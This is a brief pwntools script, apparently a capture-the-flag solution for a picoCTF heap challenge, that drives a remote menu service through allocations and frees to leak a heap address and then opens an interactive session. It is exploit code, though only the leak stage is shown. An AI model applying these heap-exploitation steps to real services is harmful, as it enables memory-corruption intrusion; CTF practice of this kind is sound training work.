from pwn import *

HOST, PORT = 'mars.picoctf.net', 31638
r = remote(HOST, PORT)

r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n' , '1 0 24')
r.sendline(' '.join(['65' for i in range(24)]))
for i in range(6):
    r.sendlineafter('choice: \n', f'0 {i+1} 0')
r.sendlineafter('choice: \n', '4 1')
r.sendlineafter('choice: \n', '4 2')
r.sendlineafter('choice: \n', '4 0')
r.sendline('2 0')
r.recvuntil('choice: \n')
heap_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
heap = heap_leak - 0x13cf0
print(hex(heap))

r.interactive()